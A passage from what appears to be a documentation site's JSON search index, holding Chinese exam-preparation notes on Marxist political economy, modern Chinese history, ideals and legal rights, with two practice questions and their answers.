\u6700\u540e\uff0c\u6709\u4e9b\u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u5177\u6709\u590d\u5408\u578b\u7684\u5173\u7cfb\uff0c\u5373\u4e00\u4e2a\u884c\u4e3a\u53ef\u4ee5\u540c\u65f6\u662f\u6743\u5229\u884c\u4e3a\u548c\u4e49\u52a1\u884c\u4e3a\u3002 2. \u7b2c\u56db\u5468 # 2.1. \u56db\u4e2a\u5168\u9762 # \u6218\u7565\u76ee\u6807\u3001\u5173\u952e\u4e00\u6b65\uff1a\u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a \u6218\u7565\u4e3e\u63aa\uff1a\u5168\u9762\u6df1\u5316\u6539\u9769\uff0c\u5168\u9762\u4f9d\u6cd5\u6cbb\u56fd\uff0c\u5168\u9762\u4ece\u4e25\u6cbb\u515a \u5173\u952e\u4e00\u62db\uff1a\u5168\u9762\u6df1\u5316\u6539\u9769 \u4e0e\u5168\u9762\u6df1\u5316\u6539\u9769\u5e76\u79f0\u8f66\u4e4b\u53cc\u8f6e\uff0c\u9e1f\u4e4b\u53cc\u7ffc\uff1a\u5168\u9762\u4f9d\u6cd5\u6cbb\u56fd \u4f1f\u5927\u590d\u5174\u7684\u6839\u672c\u4fdd\u8bc1\uff1a\u5168\u9762\u4ece\u4e25\u6cbb\u515a","title":"3.\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e09\u5b63"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#_1","text":"","title":"\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e09\u5b63"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#_2","text":"\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e09\u5b63 \u76ee\u5f55 1. \u7b2c\u4e09\u5468 1.1. \u793e\u4f1a\u5b58\u5728\u7684\u7ec4\u6210\u90e8\u5206 1.2. \u8f9b\u4ea5\u9769\u547d 1.3. \u8d44\u672c\u7684\u6709\u673a\u6784\u6210 1.4. \u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210 1.5. \u7406\u60f3\u4fe1\u5ff5 1.6. \u6743\u5229\u4e0e\u4e49\u52a1 2. \u7b2c\u56db\u5468 2.1. \u56db\u4e2a\u5168\u9762","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#1","text":"","title":"1. \u7b2c\u4e09\u5468"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#11","text":"\u793e\u4f1a\u5b58\u5728\u7684\u4e09\u4e2a\u7ec4\u6210\u90e8\u5206\uff0c\u751f\u4ea7\u65b9\u5f0f\uff08\u51b3\u5b9a\u4f5c\u7528\uff09\uff0c\u5730\u7406\u73af\u5883\u56e0\u7d20\u548c\u4eba\u5de5\u56e0\u7d20 \u793e\u4f1a\u5b58\u5728\u51b3\u5b9a\u793e\u4f1a\u610f\u8bc6\uff0c\u8868\u73b0\u4e3a \u53d1\u5c55\u7684\u4e0d\u5e73\u8861\u6027 \u793e\u4f1a\u5386\u53f2\u6027 \u80fd\u52a8\u7684\u53cd\u4f5c\u7528\uff08\u6700\u4e3b\u8981\uff09","title":"1.1. \u793e\u4f1a\u5b58\u5728\u7684\u7ec4\u6210\u90e8\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#12","text":"\u8f9b\u4ea5\u9769\u547d\u6ca1\u6709\u5b8c\u6210\u53cd\u5e1d\u53cd\u5c01\u5efa\u7684\u9769\u547d\u4efb\u52a1 \u7b2c\u4e00\uff0c\u8f9b\u4ea5\u9769\u547d\u6ca1\u6709\u5f7b\u5e95\u7684\u53cd\u5e1d\u7eb2\u9886\uff0c\u9769\u547d\u515a\u4eba\u751a\u81f3\u5bf9\u5e1d\u56fd\u4e3b\u4e49\u8fd8\u62b1\u6709\u5929\u771f\u7684\u5e7b\u60f3\uff0c\u4f01\u56fe\u5f97\u5230\u5e1d\u56fd\u4e3b\u4e49\u7684\u627f\u8ba4\u3002\u9769\u547d\u540e\uff0c\u5e1d\u56fd\u4e3b\u4e49\u5217\u5f3a\u5171\u540c\u4fb5\u7565\u4e2d\u56fd\u7684\u5c40\u9762\u6ca1\u6709\u4efb\u4f55\u6539\u53d8\u3002 \u7b2c\u4e8c\uff0c\u8f9b\u4ea5\u9769\u547d\u6ca1\u6709\u5f7b\u5e95\u7684\u53cd\u5bf9\u5c01\u5efa\u571f\u5730\u6240\u6709\u5236\u7684\u7eb2\u9886\uff0c\u6ca1\u6709\u89e3\u51b3\u519c\u6c11\u7684\u571f\u5730\u95ee\u9898\u3002\u201c\u5e73\u5747\u5730\u6743\u201d\u7684\u4e3b\u5f20\u672a\u80fd\u5b9e\u884c\uff0c\u65e0\u6cd5\u8c03\u52a8\u519c\u6c11\u9636\u7ea7\u7684\u9769\u547d\u79ef\u6781\u6027\u3002 \u7b2c\u4e09\uff0c\u9769\u547d\u7684\u80dc\u5229\u679c\u5b9e\u88ab\u8881\u4e16\u51ef\u7a83\u53d6\uff0c\u800c\u8881\u4e16\u51ef\u662f\u4e00\u4e2a\u5c01\u5efa\u519b\u9600\uff0c\u53c8\u662f\u4e00\u4e2a\u5e1d\u56fd\u4e3b\u4e49\u6276\u690d\u7684\u65b0\u7684\u4ee3\u7406\u4eba\uff0c\u65f6\u65f6\u5904\u5904\u4ee5\u5efa\u7acb\u5c01\u5efa\u4e13\u5236\u7edf\u6cbb\uff0c\u51fa\u5356\u6c11\u65cf\u5229\u76ca\u4e3a\u5df1\u4efb\uff0c\u65e2\u662f\u5c01\u5efa\u4e3b\u4e49\u7684\u4ee3\u8a00\u4eba\uff0c\u53c8\u662f\u5e1d\u56fd\u4e3b\u4e49\u7684\u4ee3\u7406\u4eba\u3002 \u603b\u4e4b\uff0c\u8f9b\u4ea5\u9769\u547d\u6ca1\u6709\u6539\u53d8\u4e2d\u56fd\u534a\u6b96\u6c11\u5730\u534a\u5c01\u5efa\u793e\u4f1a\u7684\u6027\u8d28\uff0c\u6ca1\u6709\u5b8c\u6210\u53cd\u5e1d\u53cd\u5c01\u5efa\u7684\u9769\u547d\u4efb\u52a1\u3002","title":"1.2. \u8f9b\u4ea5\u9769\u547d"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#13","text":"\u8d44\u672c\u5bb6\u5e0c\u671b\u83b7\u53d6\u66f4\u9ad8\u7684\u5229\u6da6\uff0c\u5219 c \u56fa\u5b9a\u8d44\u672c\u6bd4\u4f8b\u589e\u52a0 v \u53ef\u53d8\u8d44\u672c\u6bd4\u4f8b\u51cf\u5c11 \u4ece\u800c\u5bfc\u81f4\u8d44\u672c\u6709\u673a\u6784\u6210 c/v \u63d0\u9ad8\u3002\u6709\u673a\u6784\u6210\u63d0\u9ad8\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u673a\u5668\u6362\u4eba\uff0c\u5bfc\u81f4\u4eba\u53e3\u76f8\u5bf9\u8fc7\u5269\u3002 \u793e\u4f1a\u589e\u957f\u8d22\u5bcc\u548c\u6d88\u9664\u8d2b\u56f0\u7684\u6839\u672c\u9014\u5f84\u662f\u53d1\u5c55\u751f\u4ea7\u529b\uff0c\u6d88\u706d\u8d44\u672c\u4e3b\u4e49\uff0c\u8fdb\u5165\u5171\u4ea7\u4e3b\u4e49\u793e\u4f1a\u3002","title":"1.3. \u8d44\u672c\u7684\u6709\u673a\u6784\u6210"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#14","text":"\u4e0d\u53d8\u8d44\u672c \uff1a\u4e0d\u53d8\u8d44\u672c\u662f\u6307\u5728\u5269\u4f59\u4ef7\u503c\u751f\u4ea7\u8fc7\u7a0b\u4e2d\u8f6c\u53d8\u4e3a\u751f\u4ea7\u8d44\u6599\u7684\u90a3\u4e00\u90e8\u5206\u8d44\u672c\uff08\u7528\u5b57\u6bcdC\u8868\u793a\uff09\uff0c\u5373\u4ee5\u751f\u4ea7\u8d44\u6599\u5f62\u6001\u5b58\u5728\u7684\u8d44\u672c\uff0c\u7ecf\u8fc7\u751f\u4ea7\u8fc7\u7a0b\uff0c\u5b83\u7684\u4ef7\u503c\u968f\u7740\u7269\u8d28\u5f62\u6001\u7684\u6539\u53d8\uff0c\u8f6c\u79fb\u5230\u65b0\u4ea7\u54c1\u4e2d\u53bb\uff0c\u6ca1\u6709\u53d1\u751f\u4efb\u4f55\u4ef7\u503c\u91cf\u7684\u53d8\u5316\uff0c\u4ef7\u503c\u4e0d\u4f1a\u589e\u503c\u3002 \u8d44\u672c\u5bb6\u7528\u4e8e\u8d2d\u4e70\u751f\u4ea7\u8d44\u6599\u7684\u90a3\u4e00\u90e8\u5206\u8d44\u672c\u3002\u751f\u4ea7\u8d44\u6599\u5728\u751f\u4ea7\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u662f\u5c06\u5176\u4ef7\u503c\u8f6c\u79fb\u5230\u4ea7\u54c1\u4e2d\u53bb\uff0c\u4e0d\u6539\u53d8\u539f\u6709\u7684\u4ef7\u503c\u91cf\uff0c\u6545\u8d2d\u4e70\u751f\u4ea7\u8d44\u6599\u7684\u90a3\u90e8\u5206\u8d44\u672c\u79f0\u4e3a\u4e0d\u53d8\u8d44\u672c\u3002 \u53ef\u53d8\u8d44\u672c \uff1a\u53ef\u53d8\u8d44\u672c(V)\u6307\u7684\u662f\u8d44\u672c\u5bb6\u7528\u4e8e\u8d2d\u4e70\u52b3\u52a8\u529b\u7684\u90a3\u4e00\u90e8\u5206\u8d44\u672c\u3002\u52b3\u52a8\u529b\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u4ec5\u80fd\u591f\u521b\u9020\u51fa\u8865\u507f\u52b3\u52a8\u529b\u4ef7\u503c\u7684\u4ef7\u503c\uff0c\u800c\u4e14\u80fd\u521b\u9020\u51fa\u5269\u4f59\u4ef7\u503c\uff0c\u4f7f\u8d44\u672c\u589e\u503c\u3002\u8fd9\u4e2a\u5269\u4f59\u4ef7\u503c\u672c\u8eab\u662f\u53ef\u53d8\u5316\u7684\uff0c\u4ece\u800c\u8f6c\u5316\u4e3a\u52b3\u52a8\u529b\u7684\u90a3\u90e8\u5206\u8d44\u672c\u5728\u751f\u4ea7\u8fc7\u7a0b\u4e2d\u6539\u53d8\u81ea\u5df1\u7684\u4ef7\u503c\u91cf\uff0c\u9a6c\u514b\u601d\u79f0\u4e4b\u4e3a\u53ef\u53d8\u8d44\u672c\u3002\u8d44\u4ea7\u9636\u7ea7\u7ecf\u6d4e\u5b66\u5bb6\u53ea\u627f\u8ba4\u56fa\u5b9a\u8d44\u672c\u548c\u6d41\u52a8\u8d44\u672c\u7684\u5212\u5206\uff0c\u800c\u4e0d\u627f\u8ba4\u4e0d\u53d8\u8d44\u672c\u548c\u53ef\u53d8\u8d44\u672c\u7684\u5212\u5206\u3002 \u8d44\u672c\u4ef7\u503c\u6784\u6210 (value composition of capital) \u662f\u6307\u8d44\u672c\u5728\u4ef7\u503c\u5f62\u6001\u4e0a\u7531\u4e0d\u53d8\u8d44\u672c\u548c\u53ef\u53d8\u8d44\u672c\u6240\u6784\u6210\u7684\u6570\u91cf\u6bd4\u4f8b\u3002\u4ea7\u4e1a\u8d44\u672c\u5bb6\u7528\u4e8e\u751f\u4ea7\u7684\u8d44\u672c\uff0c\u4ece\u4ef7\u503c\u5f62\u6001\u6765\u770b,\u8868\u73b0\u4e3a\u751f\u4ea7\u8d44\u6599\u7684\u4ef7\u503c\u548c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u4e24\u4e2a\u90e8\u5206,\u4e5f\u5c31\u662f\u7531\u4e0d\u53d8\u8d44\u672c\u548c\u53ef\u53d8\u8d44\u672c\u6240\u7ec4\u6210\u3002\u9a6c\u514b\u601d\u628a\u4e0d\u53d8\u8d44\u672c\u548c\u53ef\u53d8\u8d44\u672c\u6240\u6784\u6210\u7684\u8fd9\u79cd\u6bd4\u4f8b\u5173\u7cfb\uff0c\u79f0\u4e3a\u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210\u3002 \u8d44\u672c\u4ef7\u503c\u6784\u6210\u7684\u53d8\u5316\uff0c\u867d\u7136\u4e00\u822c\u5730\u662f\u8d44\u672c\u6280\u672f\u6784\u6210\u53d8\u5316\u7684\u53cd\u6620\uff0c\u4f46\u662f\uff0c\u8d44\u672c\u4ef7\u503c\u6784\u6210\u7684\u53d8\u5316\uff0c\u53ea\u662f\u8fd1\u4f3c\u5730\u3001\u800c\u4e0d\u662f\u5b8c\u5168\u5730\u53cd\u6620\u8d44\u672c\u6280\u672f\u6784\u6210\u7684\u53d8\u5316\u3002 \u4ef7\u503c\u6784\u6210\u672a\u53d8\u5316\u7684\u60c5\u51b5 \u5f53\u8d44\u672c\u7684\u6280\u672f\u6784\u6210\u5e76\u672a\u53d8\u5316\uff0c\u800c\u751f\u4ea7\u8d44\u6599\u540c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u548c\u4ef7\u683c\u5374\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u4f1a\u5f15\u8d77\u8d44\u672c\u4ef7\u503c\u6784\u6210\u7684\u53d8\u5316\u3002\u5982\u679c\u751f\u4ea7\u8d44\u6599\u7684\u4ef7\u503c\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u800c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u4e0d\u53d8\uff1b\u6216\u8005\u751f\u4ea7\u8d44\u6599\u7684\u4ef7\u503c\u4e0d\u53d8\uff0c\u800c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u53d1\u751f\u4e86\u53d8\u5316\uff1b\u6216\u8005\u751f\u4ea7\u8d44\u6599\u548c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u90fd\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4f46\u53d8\u5316\u7684\u7a0b\u5ea6\u4e0d\u540c\uff0c\u5176\u7ed3\u679c\u90fd\u4f1a\u5f15\u8d77\u8d44\u672c\u4ef7\u503c\u6784\u6210\u53d1\u751f\u53d8\u5316\u3002 \u4ef7\u503c\u6784\u6210\u53d1\u751f\u53d8\u5316\u7684\u60c5\u51b5 \u5f53\u8d44\u672c\u6280\u672f\u6784\u6210\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u8fd9\u610f\u5473\u7740\u4e00\u5b9a\u6570\u91cf\u7684\u751f\u4ea7\u8d44\u6599\u548c\u4f7f\u7528\u8fd9\u4e9b\u751f\u4ea7\u8d44\u6599\u6240\u5fc5\u9700\u7684\u52b3\u52a8\u529b\u6570\u91cf\u4e4b\u95f4\u7684\u6bd4\u4f8b\u53d1\u751f\u4e86\u53d8\u5316,\u5982\u679c\u751f\u4ea7\u8d44\u6599\u548c\u52b3\u52a8\u529b\u7684\u8fd9\u79cd\u6570\u91cf\u4e0a\u7684\u53d8\u5316,\u88ab\u751f\u4ea7\u8d44\u6599\u548c\u52b3\u52a8\u529b\u4ef7\u503c\u4e0a\u7684\u76f8\u53cd\u53d8\u5316\u6240\u5b8c\u5168\u62b5\u6d88\u6216\u90e8\u5206\u62b5\u6d88,\u5219\u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210\u5c31\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316,\u6216\u4e0d\u4f1a\u53d1\u751f\u76f8\u5e94\u7684\u53d8\u5316\u3002 \u5e74\u4efd \u6bcf\u4e00\u96c7\u5458\u5e73\u5747\u88c5\u5907\u7684\u8d44\u4ea7\uff08\u7f8e\u5143\uff09 \u6bcf\u4e00\u96c7\u5458\u5e73\u5747\u5e74\u5de5\u8d44\uff08\u7f8e\u5143\uff09 \u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210(c:v) \u884c\u4e1a\u5e73\u5747\u80a1\u672c\u5229\u6da6\u7387\uff08%\uff09 1960 15,511 5,342 71.7:28.3 9.1% 1967 19,192 6,879 73.6:26.4 11.3% 1970 24,086 8,153 74.7:25.3 9.5% 1975 37,929 11,905 76.1:23.9 11.6% 1980 55,505 17,974 75.5:24.5 14.4% 1985 79,190 24,547 76.3:23.7 11.5% 1960-1985\u53d8\u5316\uff08%\uff09 510% 459.5% \u8d44\u672c\u6280\u672f\u6784\u6210\u7684\u53d8\u5316\uff0c\u4e00\u822c\u90fd\u662f\u7531\u52b3\u52a8\u751f\u4ea7\u7387\u7684\u53d8\u5316\u800c\u5f15\u8d77\u7684 \u3002\u968f\u7740\u52b3\u52a8\u751f\u4ea7\u7387\u7684\u63d0\u9ad8\uff0c\u6bcf\u4e2a\u5de5\u4eba\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u6240\u4f7f\u7528\u7684\u751f\u4ea7\u8d44\u6599\u7684\u6570\u91cf\u76f8\u5e94\u589e\u591a\uff0c\u8d44\u672c\u6280\u672f\u6784\u6210\u4e5f\u4f1a\u63d0\u9ad8\u3002\u4f46\u662f,\u793e\u4f1a\u52b3\u52a8\u751f\u4ea7\u7387\u7684\u63d0\u9ad8,\u53c8\u4f1a\u5f15\u8d77\u751f\u4ea7\u8d44\u6599\u4ef7\u503c\u7684\u4e0b\u964d\uff0c\u56e0\u800c \u5728\u52b3\u52a8\u751f\u4ea7\u7387\u63d0\u9ad8\u7684\u540c\u65f6 \uff0c\u4e00\u5b9a\u6570\u91cf\u7684\u52b3\u52a8\u529b\u6240\u4f7f\u7528\u7684\u751f\u4ea7\u8d44\u6599\u6570\u91cf\u867d\u7136\u589e\u591a\uff0c\u4f46\u662f\u7531\u4e8e\u751f\u4ea7\u8d44\u6599\u4ef7\u503c\u7684\u4e0b\u964d\uff0c \u8d44\u672c\u4ef7\u503c\u6784\u6210\u63d0\u9ad8\u7684\u7a0b\u5ea6\uff0c\u8981\u5c0f\u4e8e\u8d44\u672c\u6280\u672f\u6784\u6210\u63d0\u9ad8\u7684\u7a0b\u5ea6 \u3002 \u540c\u65f6\uff0c\u793e\u4f1a\u52b3\u52a8\u751f\u4ea7\u7387\u7684\u63d0\u9ad8\uff0c\u53c8\u4f1a\u5f15\u8d77\u751f\u6d3b\u8d44\u6599\u7684\u4ef7\u503c\u4e0b\u964d\uff0c\u4ece\u800c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u4e5f\u4f1a\u964d\u4f4e\uff0c\u8fd9\u6837\uff0c\u53c8\u5bfc\u81f4\u8d44\u672c\u4ef7\u503c\u6784\u6210\u6709\u6240\u63d0\u9ad8 \u3002\u7136\u800c\uff0c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u8981\u53d7\u5230\u5404\u79cd\u793e\u4f1a\u5386\u53f2\u548c\u9053\u5fb7\u56e0\u7d20\u7684\u5236\u7ea6\u3002\u968f\u7740\u793e\u4f1a\u7ecf\u6d4e\u7684\u53d1\u5c55\u548c\u7269\u8d28\u6587\u5316\u751f\u6d3b\u6c34\u5e73\u7684\u63d0\u9ad8\uff0c\u52b3\u52a8\u529b\u4ef7\u503c\u6240\u4ee3\u8868\u7684\u751f\u6d3b\u8d44\u6599\u7684\u6570\u91cf\u9010\u6b65\u6709\u6240\u589e\u591a\uff0c\u4ece\u800c\u4f1a\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u904f\u5236\u52b3\u52a8\u529b\u4ef7\u503c\u7684\u4e0b\u964d\u901f\u5ea6\u3002\u8fd9\u6837\uff0c\u5728\u793e\u4f1a\u52b3\u52a8\u751f\u4ea7\u7387\u63d0\u9ad8\u65f6\uff0c\u52b3\u52a8\u529b\u4ef7\u503c\u5c3d\u7ba1\u6709\u6240\u4e0b\u964d\uff0c\u4f46\u662f\uff0c\u4e0b\u964d\u7684\u901f\u5ea6\u4e00\u822c\u8981\u6162\u4e8e\u751f\u4ea7\u8d44\u6599\u4ef7\u503c\u4e0b\u964d\u7684\u901f\u5ea6\u3002 \u6240\u4ee5\uff0c\u5f53\u8d44\u672c\u6280\u672f\u6784\u6210\u63d0\u9ad8\u65f6\uff0c\u8d44\u672c\u4ef7\u503c\u6784\u6210\u4ecd\u4f1a\u63d0\u9ad8\uff0c\u4e0d\u8fc7\uff0c\u5b83\u63d0\u9ad8\u7684\u7a0b\u5ea6\u548c\u901f\u5ea6\uff0c\u8981\u5927\u5927\u4f4e\u4e8e\u8d44\u672c\u6280\u672f\u6784\u6210\u63d0\u9ad8\u7684\u7a0b\u5ea6\u548c\u901f\u5ea6 \u3002","title":"1.4. \u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#15","text":"\u7406\u60f3\u4f5c\u4e3a\u4e00\u79cd\u7cbe\u795e\u73b0\u8c61\uff0c\u662f\u4eba\u7c7b\u793e\u4f1a\u65f6\u95f4\u7684\u4ea7\u7269\u3002\u7406\u60f3\u6e90\u4e8e\u73b0\u5b9e\uff0c\u53c8\u8d85\u8d8a\u73b0\u5b9e\uff0c\u5728\u73b0\u5b9e\u4e2d\u53c8\u591a\u79cd\u7c7b\u578b\u3002\u4ece\u5c42\u6b21\u4e0a\u5212\u5206\uff0c\u7406\u60f3\u6709\uff1a A. \u4e2a\u4eba\u7406\u60f3\u4e0e\u793e\u4f1a\u7406\u60f3 B. \u9053\u5fb7\u7406\u60f3\u548c\u653f\u6cbb\u7406\u60f3 C. \u751f\u6d3b\u7406\u60f3\u548c\u804c\u4e1a\u7406\u60f3 D. \u5d07\u9ad8\u7406\u60f3\u548c\u4e00\u822c\u7406\u60f3 \u7b54\u6848 \u7b54\u6848\uff1aD \u4ece\u5c42\u6b21\u4e0a\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u5d07\u9ad8\u7406\u60f3\u548c\u4e00\u822c\u7406\u60f3\u3002 \u4ece\u5185\u5bb9\u4e0a\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u9053\u5fb7\u7406\u60f3\u3001\u653f\u6cbb\u7406\u60f3\uff0c\u751f\u6d3b\u7406\u60f3\u548c\u804c\u4e1a\u7406\u60f3\u3002 \u4ece\u4e3b\u4f53\u4e0a\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u4e2a\u4eba\u7406\u60f3\u4e0e\u793e\u4f1a\u7406\u60f3\u3002 \u4ece\u65f6\u95f4\u4e0a\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u8fd1\u671f\u7406\u60f3\u548c\u8fdc\u671f\u7406\u60f3\u3002 \u7406\u60f3\u548c\u4fe1\u5ff5\u603b\u662f\u76f8\u4e92\u4f9d\u5b58\uff0c\u7406\u60f3\u662f\u4fe1\u5ff5\u6240\u6307\u7684\u5bf9\u8c61\uff0c\u4fe1\u5ff5\u5219\u662f\u7406\u60f3\u5b9e\u73b0\u7684\u4fdd\u969c\u3002 \u4fe1\u4ef0\u662f\u6700\u9ad8\u5c42\u6b21\u7684\u4fe1\u5ff5\uff0c\u5177\u6709\u6700\u5927\u7684\u7edf\u6444\u529b\u3002","title":"1.5. \u7406\u60f3\u4fe1\u5ff5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#16","text":"\u3010\u591a\u9009\u3011\u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u5c31\u50cf\u4e00\u679a\u786c\u5e01\u7684\u4e24\u9762\uff0c\u5bc6\u4e0d\u53ef\u5206\u3002\u4e8c\u8005\u4e4b\u95f4\u5173\u7cfb\u7684\u6b63\u786e\u8868\u8ff0\u662f A. \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u662f\u4e92\u76f8\u4f9d\u5b58\u7684\u5173\u7cfb B. \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u662f\u76ee\u7684\u4e0e\u624b\u6bb5\u7684\u5173\u7cfb C. \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u5177\u6709\u987a\u5e8f\u6027 D. \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u5177\u6709\u4e8c\u91cd\u6027 \u7b54\u6848 \u7b54\u6848\uff1aABD \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u7684\u5173\u7cfb\uff0c\u5c31\u50cf\u4e00\u679a\u786c\u5e01\u7684\u4e24\u9762\uff0c\u4e0d\u53ef\u5206\u5272\uff0c\u76f8\u4e92\u4f9d\u5b58\u3002 \u9996\u5148\uff0c\u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u662f\u76f8\u4e92\u4f9d\u5b58\u7684\u5173\u7cfb\uff0c\u6cd5\u5f8b\u6743\u5229\u7684\u5b9e\u73b0\u5fc5\u987b\u4ee5\u76f8\u5e94\u6cd5\u5f8b\u4e49\u52a1\u7684\u5c65\u884c\u4e3a\u6761\u4ef6\u3002 \u5176\u6b21\uff0c\u6cd5\u5f8b\u6743\u5229\u4e0e\u6cd5\u5f8b\u4e49\u52a1\u662f\u76ee\u7684\u548c\u624b\u6bb5\u7684\u5173\u7cfb\u3002\u79bb\u5f00\u4e86\u6cd5\u5f8b\u6743\u5229\uff0c\u6cd5\u5f8b\u4e49\u52a1\u5c31\u5931\u53bb\u4e86\u5c65\u884c\u7684\u4ef7\u503c\u548c\u52a8\u529b\uff1b\u79bb\u5f00\u4e86\u6cd5\u5f8b\u4e49\u52a1\uff0c\u6cd5\u5f8b\u6743\u5229\u4e5f\u5f62\u540c\u865a\u8bbe\u3002\u5982\u8d22\u4ea7\u6743\u548c\u4e0d\u5f97\u4fb5\u5bb3\u4ed6\u4eba\u8d22\u4ea7\u7684\u4e49\u52a1\u3002 \u6700\u540e\uff0c\u6709\u4e9b\u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u5177\u6709\u590d\u5408\u578b\u7684\u5173\u7cfb\uff0c\u5373\u4e00\u4e2a\u884c\u4e3a\u53ef\u4ee5\u540c\u65f6\u662f\u6743\u5229\u884c\u4e3a\u548c\u4e49\u52a1\u884c\u4e3a\u3002","title":"1.6. 